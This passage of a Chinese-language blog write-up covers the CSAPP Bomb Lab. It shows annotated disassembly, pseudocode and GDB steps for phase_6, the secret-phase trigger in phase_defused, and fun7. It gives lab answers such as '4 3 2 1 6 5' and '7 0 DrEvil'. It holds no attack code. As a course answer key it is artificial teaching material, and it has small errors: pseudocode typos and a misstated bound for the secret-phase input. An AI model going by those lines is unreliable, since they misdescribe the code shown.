4011ee</span><br><span class="line">4011e9:	e8 4c 02 00 00       	callq  40143a &lt;explode_bomb&gt;		# 调用 explode_bomb，炸弹爆炸</span><br><span class="line"></span><br><span class="line">4011ee:	48 8b 5b 08          	mov    0x8(%rbx),%rbx				# %rbx = *(%rbx + 0x8)</span><br><span class="line">4011f2:	83 ed 01             	sub    $0x1,%ebp					# %ebp -= 0x1</span><br><span class="line">4011f5:	75 e8                	jne    4011df &lt;phase_6+0xeb&gt;		# if %ebp != 0x0，跳转到 4011df</span><br></pre></td></tr></table></figure>

<ul>
<li>上述汇编代码对应的伪代码如下</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">rbx = *(rsp + <span class="number">32</span>); <span class="comment">// 第一个结点的起始地址</span></span><br><span class="line">ebp = <span class="number">5</span>;</span><br><span class="line"><span class="keyword">do</span> &#123;</span><br><span class="line">    rax = *(rbx + <span class="number">8</span>); <span class="comment">// rbx 之后结点的起始地址</span></span><br><span class="line">	rax = *(rax); <span class="comment">// 结点所指向的值</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> (*(rbx) &lt; rax) &#123; <span class="comment">// 前一个结点的值必须小于后一个结点</span></span><br><span class="line">        explode_bomn();</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    rbx = *(rbx + <span class="number">8</span>); <span class="comment">// 下一个结点的起始地址</span></span><br><span class="line">    ebp -= <span class="number">1</span>;</span><br><span class="line">&#125; <span class="keyword">while</span> (ecp != <span class="number">0</span>)</span><br></pre></td></tr></table></figure>

<ul>
<li>因为要确保我们得到的单链表中结点存储的值是按照从大到小排序的，所以我们再次通过相关命令得到每个结点存储的值，方便我们按照从大到小排序</li>
</ul>
<img src="/2024/03/05/CSAPP-Lab2/image-20240310091836891.png" class="" title="image-20240310091836891">

<ul>
<li>我们发现结点存储值大小从大到小排序是：node3 &gt; node4 &gt; node5 &gt; node6 &gt; node1 &gt; node2</li>
</ul>
<table>
<thead>
<tr>
<th>结点</th>
<th>起始地址</th>
<th>值</th>
</tr>
</thead>
<tbody><tr>
<td>node1</td>
<td>0x6032d0</td>
<td>0x14c</td>
</tr>
<tr>
<td>node2</td>
<td>0x6032e0</td>
<td>0xa8</td>
</tr>
<tr>
<td>node3</td>
<td>0x6032f0</td>
<td>0x39c</td>
</tr>
<tr>
<td>node4</td>
<td>0x603300</td>
<td>0x2b3</td>
</tr>
<tr>
<td>node5</td>
<td>0x603310</td>
<td>0x1dd</td>
</tr>
<tr>
<td>node6</td>
<td>0x603320</td>
<td>0x1bb</td>
</tr>
</tbody></table>
<ul>
<li>为了使得连接后的单链表中结点从大到小排序，所以我们输入：4 3 2 1 6 5，这样通过 7 - x 就分别赋予了：3 4 5 6 1 2 结点</li>
</ul>
<h2 id="Result-5"><a href="#Result-5" class="headerlink" title="Result"></a>Result</h2><ul>
<li>正确答案是：<strong>4 3 2 1 6 5</strong></li>
<li><strong>运行结果</strong></li>
</ul>
<img src="/2024/03/05/CSAPP-Lab2/image-20240310093837993.png" class="" title="image-20240310093837993">

<h1 id="secret-phase"><a href="#secret-phase" class="headerlink" title="secret_phase"></a>secret_phase</h1><ul>
<li>就当我们认为已经完成了的时候，一句注释打醒了我们！</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Wow, they got it!  But isn&#x27;t something... missing?  Perhaps</span></span><br><span class="line"><span class="comment">    * something they overlooked?  Mua ha ha ha ha! */</span></span><br></pre></td></tr></table></figure>

<h2 id="phase-defused"><a href="#phase-defused" class="headerlink" title="phase_defused"></a>phase_defused</h2><ul>
<li>注释提醒我们还有一个隐藏关卡，我们仔细检查 bomb.s 文件，发现确实有一个 secret_phase 的函数，它很有可能就是隐藏关卡</li>
<li>但怎么才能进入隐藏关卡呢，我们又发现：phase_defused 会调用隐藏关卡，而 phase_defused 在每次调用完 phase_i 后都会调用</li>
<li>仔细分析 phase_defused 的汇编代码</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line">00000000004015c4 &lt;phase_defused&gt;:</span><br><span class="line">  4015c4:	48 83 ec 78          	sub    $0x78,%rsp					# %rsp -= 0x78</span><br><span class="line">  4015c8:	64 48 8b 04 25 28 00 	mov    %fs:0x28,%rax				# %rax = %fs:0x28</span><br><span class="line">  4015cf:	00 00 </span><br><span class="line">  4015d1:	48 89 44 24 68       	mov    %rax,0x68(%rsp)				# *(%rsp + 0x68) = %rax</span><br><span class="line">  4015d6:	31 c0                	xor    %eax,%eax					# eax ^= %eax</span><br><span class="line">  4015d8:	83 3d 81 21 20 00 06 	cmpl   $0x6,0x202181(%rip)        	# 603760 &lt;num_input_strings&gt;</span><br><span class="line">  4015df:	75 5e                	jne    40163f &lt;phase_defused+0x7b&gt;	# *(%rip + 0x202181) != 0x6，跳转到 40163f</span><br><span class="line">  </span><br><span class="line">  4015e1:	4c 8d 44 24 10       	lea    0x10(%rsp),%r8				# %r8 = %rsp + 0x10				</span><br><span class="line">  4015e6:	48 8d 4c 24 0c       	lea    0xc(%rsp),%rcx				# %rcx = %rsp + 0xc</span><br><span class="line">  4015eb:	48 8d 54 24 08       	lea    0x8(%rsp),%rdx				# %rdx = %rsp + 0x8</span><br><span class="line">  4015f0:	be 19 26 40 00       	mov    $0x402619,%esi				# %esi = 0x402619（%d %d %s）</span><br><span class="line">  4015f5:	bf 70 38 60 00       	mov    $0x603870,%edi				# %edi = 0x603870（&quot;&quot;）</span><br><span class="line">  4015fa:	e8 f1 f5 ff ff       	callq  400bf0 &lt;__isoc99_sscanf@plt&gt;	# 调用 sscanf</span><br><span class="line">  4015ff:	83 f8 03             	cmp    $0x3,%eax			</span><br><span class="line">  401602:	75 31                	jne    401635 &lt;phase_defused+0x71&gt;	# if %eax != 0x3，跳转到 401635</span><br><span class="line">  401604:	be 22 26 40 00       	mov    $0x402622,%esi				# esi = 0x402622 </span><br><span class="line">  401609:	48 8d 7c 24 10       	lea    0x10(%rsp),%rdi				# %rdi = %rsp + 0x10</span><br><span class="line">  40160e:	e8 25 fd ff ff       	callq  401338 &lt;strings_not_equal&gt;	# 调用 strings_not_equal </span><br><span class="line">  401613:	85 c0                	test   %eax,%eax			</span><br><span class="line">  401615:	75 1e                	jne    401635 &lt;phase_defused+0x71&gt;	# if %eax != 0，跳转到 401635 </span><br><span class="line">  </span><br><span class="line">  401617:	bf f8 24 40 00       	mov    $0x4024f8,%edi				# %edi = 0x4024f8（Curses, you&#x27;ve found the secret phase!)</span><br><span class="line">  40161c:	e8 ef f4 ff ff       	callq  400b10 &lt;puts@plt&gt;			# 调用 puts</span><br><span class="line">  401621:	bf 20 25 40 00       	mov    $0x402520,%edi				# %edi = 0x402520（But finding it and solving it are quite different...）</span><br><span class="line">  401626:	e8 e5 f4 ff ff       	callq  400b10 &lt;puts@plt&gt;			# 调用 puts</span><br><span class="line">  40162b:	b8 00 00 00 00       	mov    $0x0,%eax					# %eax = 0x0</span><br><span class="line">  401630:	e8 0d fc ff ff       	callq  401242 &lt;secret_phase&gt;		# 调用 secret_phase （</span><br><span class="line">  401635:	bf 58 25 40 00       	mov    $0x402558,%edi				# %edi = 0x402558(Congratulations! You&#x27;ve defused the bomb!)</span><br><span class="line">  40163a:	e8 d1 f4 ff ff       	callq  400b10 &lt;puts@plt&gt;			# 调用 puts</span><br><span class="line">  </span><br><span class="line">  40163f:	48 8b 44 24 68       	mov    0x68(%rsp),%rax				# %rax = %rsp + 0x68</span><br><span class="line">  401644:	64 48 33 04 25 28 00 	xor    %fs:0x28,%rax				# %rax ^= %fs:0x28</span><br><span class="line">  40164b:	00 00 </span><br><span class="line">  40164d:	74 05                	je     401654 &lt;phase_defused+0x90&gt;	# if %rax == 0，跳转到 401654</span><br><span class="line">  40164f:	e8 dc f4 ff ff       	callq  400b30 &lt;__stack_chk_fail@plt&gt;# 调用 stack_chk_fail</span><br><span class="line">  401654:	48 83 c4 78          	add    $0x78,%rsp					# %rsp += 0x78（释放内存）</span><br><span class="line">  401658:	c3                   	retq   </span><br><span class="line">  401659:	90                   	nop</span><br><span class="line">  40165a:	90                   	nop</span><br><span class="line">  40165b:	90                   	nop</span><br><span class="line">  40165c:	90                   	nop</span><br><span class="line">  40165d:	90                   	nop</span><br><span class="line">  40165e:	90                   	nop</span><br><span class="line">  40165f:	90                   	nop</span><br></pre></td></tr></table></figure>

<ul>
<li><p>首先，它为栈帧分配空间，设置一个金丝雀值入栈，防止栈溢出，接着将 %eax 赋值为 0，比较 *(%rip + 0x202181) 和 0x6，这里必须相等，否则就不会进入 secret_phase（当然我也不知道这里有什么用，代表什么意思 ……）</p>
<blockquote>
<p>查找资料，这里说明的是我们必须已经输入了 6 个字符串才能继续下去，即我们必须通过了 phase_1 ~ phase_6 才能进入隐藏关卡</p>
</blockquote>
</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">4015c4:	48 83 ec 78          	sub    $0x78,%rsp					# %rsp -= 0x78（分配空间）</span><br><span class="line">4015c8:	64 48 8b 04 25 28 00 	mov    %fs:0x28,%rax				# %rax = %fs:0x28（金丝雀值）</span><br><span class="line">4015cf:	00 00 </span><br><span class="line">4015d1:	48 89 44 24 68       	mov    %rax,0x68(%rsp)				# *(%rsp + 0x68) = %rax</span><br><span class="line">4015d6:	31 c0                	xor    %eax,%eax					# eax ^= %eax</span><br><span class="line">4015d8:	83 3d 81 21 20 00 06 	cmpl   $0x6,0x202181(%rip)        	# 603760 &lt;num_input_strings&gt;</span><br><span class="line">4015df:	75 5e                	jne    40163f &lt;phase_defused+0x7b&gt;	# *(%rip + 0x202181) != 0x6，跳转到 40163f</span><br></pre></td></tr></table></figure>

<ul>
<li>调用函数 sscanf，第一个参数 %edi &#x3D; 0x603870，我们通过命令发现里面是空的 “”</li>
<li>第二个参数 %rsi &#x3D; 0x402619，通过命令得到 %d %d %s，说明需要输入两个整数一个字符串</li>
<li>输入的这三个值存储在 %rdx %rcx %r8</li>
<li>通过之前的经验，sscanf 的返回值表示输入值的个数，这里说明我们必须输入 3 个值，否则就不会进入 secret_phase</li>
<li>通过 string_not_equal 比较我们输入的字符串和 0x402622，通过命令发现 0x402622 处指向的字符串为 <strong>DrEvil</strong>，这说明我们输入的字符串必须为 DrEvil</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">4015e1:	4c 8d 44 24 10       	lea    0x10(%rsp),%r8				# %r8 = %rsp + 0x10				</span><br><span class="line">4015e6:	48 8d 4c 24 0c       	lea    0xc(%rsp),%rcx				# %rcx = %rsp + 0xc</span><br><span class="line">4015eb:	48 8d 54 24 08       	lea    0x8(%rsp),%rdx				# %rdx = %rsp + 0x8</span><br><span class="line">4015f0:	be 19 26 40 00       	mov    $0x402619,%esi				# %esi = 0x402619（%d %d %s）</span><br><span class="line">4015f5:	bf 70 38 60 00       	mov    $0x603870,%edi				# %edi = 0x603870（&quot;&quot;）</span><br><span class="line">4015fa:	e8 f1 f5 ff ff       	callq  400bf0 &lt;__isoc99_sscanf@plt&gt;	# 调用 sscanf</span><br><span class="line">4015ff:	83 f8 03             	cmp    $0x3,%eax			</span><br><span class="line">401602:	75 31                	jne    401635 &lt;phase_defused+0x71&gt;	# if %eax != 0x3，跳转到 401635</span><br><span class="line">401604:	be 22 26 40 00       	mov    $0x402622,%esi				# esi = 0x402622 （ DrEvil）</span><br><span class="line">401609:	48 8d 7c 24 10       	lea    0x10(%rsp),%rdi				# %rdi = %rsp + 0x10</span><br><span class="line">40160e:	e8 25 fd ff ff       	callq  401338 &lt;strings_not_equal&gt;	# 调用 strings_not_equal (比较第三个输入值 和 DrEvil)</span><br><span class="line">401613:	85 c0                	test   %eax,%eax			</span><br><span class="line">401615:	75 1e                	jne    401635 &lt;phase_defused+0x71&gt;	# if %eax != 0，跳转到 401635</span><br></pre></td></tr></table></figure>



<ul>
<li><p>函数 sscanf 的作用是格式化读取指定的字符串，%edi 第一个参数为指定我们读取的值，%esi 为指定的格式 %d %d %s，我们需要知道它到底指定的是什么才能继续下去</p>
</li>
<li><p>我们在通过命令 *<em>break <em>0x4015fa</em></em> 在 0x4015fa 处设下断点，通过 *<em>print (char <em>) 0x603870</em></em> 来查看到底指定的是什么</p>
<img src="/2024/03/05/CSAPP-Lab2/image-20240310164555258.png" class="" title="image-20240310164555258">
</li>
<li><p>我们发现，它指定的是 <strong>7 0</strong>，也就是 phase_4 的答案，因此想要进入 secret_phase 的条件是：</p>
<ul>
<li><p>在 phase_4 输入 7 0 后再次输入 DrEvil，因为我们已经输入过 7 0 了，所以只需要输入 DrEvil 即可</p>
</li>
<li><p>必须完成 phase_1 ~ phase_6，如果我们在拆炸弹的中途炸弹就已经爆炸了，此时如果我们再次通过 print (char*) 0x603870 查看指定的字符串时，会显示空 “”，因为在前边我们已经判断过输入的字符串必须等于 6，即已经通过了 phase_1 ~ phase_6 才能到达这里</p>
<blockquote>
<p>如果我们检查完指定字符串后，再通过 print (char*) 0x603760 就可以得到 “&#x2F;006”（成功通过 phase_1 ~ 6 后），它记录着我们输入的字符串数，而当炸弹中途 BOOM 时，检查 0x603760 还是空的 “”</p>
</blockquote>
</li>
</ul>
</li>
</ul>
<img src="/2024/03/05/CSAPP-Lab2/image-20240310172407314.png" class="" title="image-20240310172407314">
<ul>
<li><ul>
<li>其实这里指定的值并不是固定的，phase_4 还有另一个答案 0 0，如果我们在通关时输入的是 0 0，那么 print (char*) 0x603870 就会显示指定的是 0 0</li>
</ul>
</li>
<li>函数 puts 可能是在屏幕上输出参数（%edi）的值，所以下边的汇编代码表示输出一些字符串，然后进入 secret_phase，成功通关后再输出一些字符串，这些字符串的值我们可以通过相关命令查看</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">401617:	bf f8 24 40 00       	mov    $0x4024f8,%edi				# %edi = 0x4024f8（Curses, you&#x27;ve found the secret phase!）</span><br><span class="line">40161c:	e8 ef f4 ff ff       	callq  400b10 &lt;puts@plt&gt;			# 调用 puts</span><br><span class="line">401621:	bf 20 25 40 00       	mov    $0x402520,%edi				# %edi = 0x402520（But finding it and solving it are quite different...）</span><br><span class="line">401626:	e8 e5 f4 ff ff       	callq  400b10 &lt;puts@plt&gt;			# 调用 puts</span><br><span class="line">40162b:	b8 00 00 00 00       	mov    $0x0,%eax					# %eax = 0x0</span><br><span class="line">401630:	e8 0d fc ff ff       	callq  401242 &lt;secret_phase&gt;		# 调用 secret_phase</span><br><span class="line">401635:	bf 58 25 40 00       	mov    $0x402558,%edi				# %edi = 0x402558(Congratulations! You&#x27;ve defused the bomb!）</span><br><span class="line">40163a:	e8 d1 f4 ff ff       	callq  400b10 &lt;puts@plt&gt;			# 调用 puts</span><br></pre></td></tr></table></figure>

<ul>
<li>最后就是检查金丝雀值是否被修改，检查栈是否溢出</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">40163f:	48 8b 44 24 68       	mov    0x68(%rsp),%rax				# %rax = %rsp + 0x68</span><br><span class="line">401644:	64 48 33 04 25 28 00 	xor    %fs:0x28,%rax				# %rax ^= %fs:0x28</span><br><span class="line">40164b:	00 00 </span><br><span class="line">40164d:	74 05                	je     401654 &lt;phase_defused+0x90&gt;	# if %rax == 0，跳转到 401654</span><br><span class="line">40164f:	e8 dc f4 ff ff       	callq  400b30 &lt;__stack_chk_fail@plt&gt;# 调用 stack_chk_fail</span><br><span class="line">401654:	48 83 c4 78          	add    $0x78,%rsp					# %rsp += 0x78（释放内存）</span><br></pre></td></tr></table></figure>

<ul>
<li>综上所述，如果我们想要进入 secret_phase 隐藏关卡，就需要在完成 phase_4 时加上 DrEvil，输入：<strong>7 0 DrEvil</strong></li>
</ul>
<img src="/2024/03/05/CSAPP-Lab2/image-20240310165734930.png" class="" title="image-20240310165734930">

<h2 id="secret-phase-1"><a href="#secret-phase-1" class="headerlink" title="secret_phase"></a>secret_phase</h2><ul>
<li>分析 secret_phase 的汇编代码</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">0000000000401242 &lt;secret_phase&gt;:</span><br><span class="line">  401242:	53                   	push   %rbx				</span><br><span class="line">  401243:	e8 56 02 00 00       	callq  40149e &lt;read_line&gt;			# 调用 read_line</span><br><span class="line">  401248:	ba 0a 00 00 00       	mov    $0xa,%edx					# %edx = 0xa</span><br><span class="line">  40124d:	be 00 00 00 00       	mov    $0x0,%esi					# %esi = 0x0</span><br><span class="line">  401252:	48 89 c7             	mov    %rax,%rdi					# %rdi = %rax</span><br><span class="line">  401255:	e8 76 f9 ff ff       	callq  400bd0 &lt;strtol@plt&gt;			# 调用 strtol</span><br><span class="line">  </span><br><span class="line">  40125a:	48 89 c3             	mov    %rax,%rbx					# %rbx = %rax</span><br><span class="line">  40125d:	8d 40 ff             	lea    -0x1(%rax),%eax				# %eax = %rax - 0x1</span><br><span class="line">  401260:	3d e8 03 00 00       	cmp    $0x3e8,%eax			</span><br><span class="line">  401265:	76 05                	jbe    40126c &lt;secret_phase+0x2a&gt;	# if %eax &lt;= 0x3e8，跳转到 40126c</span><br><span class="line">  401267:	e8 ce 01 00 00       	callq  40143a &lt;explode_bomb&gt;		# 调用 explode_bomb</span><br><span class="line">  40126c:	89 de                	mov    %ebx,%esi					# %esi = %ebx</span><br><span class="line">  40126e:	bf f0 30 60 00       	mov    $0x6030f0,%edi				# %edi = 0x6030f0</span><br><span class="line">  401273:	e8 8c ff ff ff       	callq  401204 &lt;fun7&gt;				# 调用 fun7</span><br><span class="line">  401278:	83 f8 02             	cmp    $0x2,%eax</span><br><span class="line">  40127b:	74 05                	je     401282 &lt;secret_phase+0x40&gt;	# if %eax == 0x2，跳转到 401282</span><br><span class="line">  40127d:	e8 b8 01 00 00       	callq  40143a &lt;explode_bomb&gt;		# 调用 explode_bomb</span><br><span class="line">  </span><br><span class="line">  401282:	bf 38 24 40 00       	mov    $0x402438,%edi				# %edi = 0x402438</span><br><span class="line">  401287:	e8 84 f8 ff ff       	callq  400b10 &lt;puts@plt&gt;			# 调用 puts</span><br><span class="line">  40128c:	e8 33 03 00 00       	callq  4015c4 &lt;phase_defused&gt;		# 调用 phase_defused</span><br><span class="line">  401291:	5b                   	pop    %rbx				</span><br><span class="line">  401292:	c3                   	retq   								# return</span><br></pre></td></tr></table></figure>

<ul>
<li><p>首先调用了函数 read_line，我们读入一行字符串，然后通过函数 strtol 将字符串转换为 long</p>
<blockquote>
<p>当然，这里的 read_line 和 strtol 都是见名知义，没有去分析其具体实现是因为 …… 有些复杂，没有搞懂！</p>
</blockquote>
</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">401242:	53                   	push   %rbx				</span><br><span class="line">401243:	e8 56 02 00 00       	callq  40149e &lt;read_line&gt;			# 调用 read_line</span><br><span class="line">401248:	ba 0a 00 00 00       	mov    $0xa,%edx					# %edx = 0xa</span><br><span class="line">40124d:	be 00 00 00 00       	mov    $0x0,%esi					# %esi = 0x0</span><br><span class="line">401252:	48 89 c7             	mov    %rax,%rdi					# %rdi = %rax</span><br><span class="line">401255:	e8 76 f9 ff ff       	callq  400bd0 &lt;strtol@plt&gt;			# 调用 strtol</span><br></pre></td></tr></table></figure>

<ul>
<li>我们必须保证输入字符串转换为 long 后必须大于 0x3e9，否则炸弹会爆炸</li>
<li>调用函数 fun7，两个参数为 %edi 和 %esi，%edi &#x3D; 0x6030f0，%esi 等于字符串转换后的 long</li>
<li>我们必须保证 fun7 的返回值必须等于 2，否则炸弹会爆炸</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">40125a:	48 89 c3             	mov    %rax,%rbx					# %rbx = %rax</span><br><span class="line">40125d:	8d 40 ff             	lea    -0x1(%rax),%eax				# %eax = %rax - 0x1</span><br><span class="line">401260:	3d e8 03 00 00       	cmp    $0x3e8,%eax			</span><br><span class="line">401265:	76 05                	jbe    40126c &lt;secret_phase+0x2a&gt;	# if %eax &lt;= 0x3e8，跳转到 40126c</span><br><span class="line">401267:	e8 ce 01 00 00       	callq  40143a &lt;explode_bomb&gt;		# 调用 explode_bomb</span><br><span class="line">40126c:	89 de                	mov    %ebx,%esi					# %esi = %ebx</span><br><span class="line">40126e:	bf f0 30 60 00       	mov    $0x6030f0,%edi				# %edi = 0x6030f0</span><br><span class="line">401273:	e8 8c ff ff ff       	callq  401204 &lt;fun7&gt;				# 调用 fun7</span><br><span class="line">401278:	83 f8 02             	cmp    $0x2,%eax</span><br><span class="line">40127b:	74 05                	je     401282 &lt;secret_phase+0x40&gt;	# if %eax == 0x2，跳转到 401282</span><br><span class="line">40127d:	e8 b8 01 00 00       	callq  40143a &lt;explode_bomb&gt;		# 调用 explode_bomb</span><br></pre></td></tr></table></figure>

<ul>
<li>最后就是调用函数 puts 在屏幕上输出一个字符串，返回</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">401282:	bf 38 24 40 00       	mov    $0x402438,%edi				# %edi = 0x402438</span><br><span class="line">401287:	e8 84 f8 ff ff       	callq  400b10 &lt;puts@plt&gt;			# 调用 puts</span><br><span class="line">40128c:	e8 33 03 00 00       	callq  4015c4 &lt;phase_defused&gt;		# 调用 phase_defused</span><br><span class="line">401291:	5b                   	pop    %rbx				</span><br><span class="line">401292:	c3                   	retq   								# return</span><br></pre></td></tr></table></figure>

<h2 id="fun7"><a href="#fun7" class="headerlink" title="fun7"></a>fun7</h2><ul>
<li>我们看一下 fun7 的汇编代码</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">0000000000401204 &lt;fun7&gt;:</span><br><span class="line">  401204:	48 83 ec 08          	sub    $0x8,%rsp			</span><br><span class="line">  401208:	48 85 ff             	test   %rdi,%rdi				</span><br><span class="line">  40120b:	74 2b                	je     401238 &lt;fun7+0x34&gt;		# if %rdi == 0，跳转到 401238</span><br><span class="line">  40120d:	8b 17                	mov    (%rdi),%edx				# %edx = *(%rdi)</span><br><span class="line">  40120f:	39 f2                	cmp    %esi,%edx			</span><br><span class="line">  401211:	7e 0d                	jle    401220 &lt;fun7+0x1c&gt;		# if %edx &lt;= %esi,跳转到 401220</span><br><span class="line">  401213:	48 8b 7f 08          	mov    0x8(%rdi),%rdi			# %rdi = *(%rdi + 0x8)</span><br><span class="line">  401217:	e8 e8 ff ff ff       	callq  401204 &lt;fun7&gt;			# 调用 fun7</span><br><span class="line">  40121c:	01 c0                	add    %eax,%eax				# %eax += %eax</span><br><span class="line">  40121e:	eb 1d                	jmp    40123d &lt;fun7+0x39&gt;		# 直接跳转到 40123d</span><br><span class="line">  401220:	b8 00 00 00 00       	mov    $0x0,%eax				# %eax = 0x0</span><br><span class="line">  401225:	39 f2                	cmp    %esi,%edx			</span><br><span class="line">  401227:	74 14                	je     40123d &lt;fun7+0x39&gt;		# if %esi == %edx，跳转到 40123d</span><br><span class="line">  401229:	48 8b 7f 10          	mov    0x10(%rdi),%rdi			# %rdi = *(%rdi + 0x10)</span><br><span class="line">  40122d:	e8 d2 ff ff ff       	callq  401204 &lt;fun7&gt;			# 调用 fun7</span><br><span class="line">  401232:	8d 44 00 01          	lea    0x1(%rax,%rax,1),%eax	# %eax = %rax + %rax + 0x1</span><br><span class="line">  401236:	eb 05                	jmp    40123d &lt;fun7+0x39&gt;		# 直接跳转到 40123d</span><br><span class="line">  401238:	b8 ff ff ff ff       	mov    $0xffffffff,%eax			# %eax = 0xffffffff</span><br><span class="line">  40123d:	48 83 c4 08          	add    $0x8,%rsp				# %rsp += 0x8（释放内存）</span><br><span class="line">  401241:	c3                   	retq   							# return </span><br></pre></td></tr></table></figure>

<ul>
<li>上述汇编代码对于的伪代码如下</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">edi = <span class="number">0x6030f0</span>;</span><br><span class="line">esi = ???</span><br><span class="line"><span class="keyword">if</span> (edi == <span class="number">0</span>) &#123;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0xffffffff</span>;</span><br><span class="line"></span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    </span><br><span class="line">    edx = *edi; <span class="comment">// 得到当前结点存储的值</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> (edx &lt; esi) &#123;</span><br><span class="line">        </span><br><span class="line">        edi = *(edi + <span class="number">16</span>);	<span class="comment">// 得到右子结点起始地址</span></span><br><span class="line">        <span class="keyword">return</span> <span class="number">2</span> * fun7(edi, esi) + <span class="number">1</span>;</span><br><span class="line">    </span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (edx &gt; esi) &#123;</span><br><span class="line">    </span><br><span class="line">        edi = *(edi + <span class="number">8</span>);		<span class="comment">// 得到左子结点起始地址</span></span><br><span class="line">        <span class="keyword">return</span> <span class="number">2</span> * fun7(edi, esi);</span><br><span class="line">    </span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
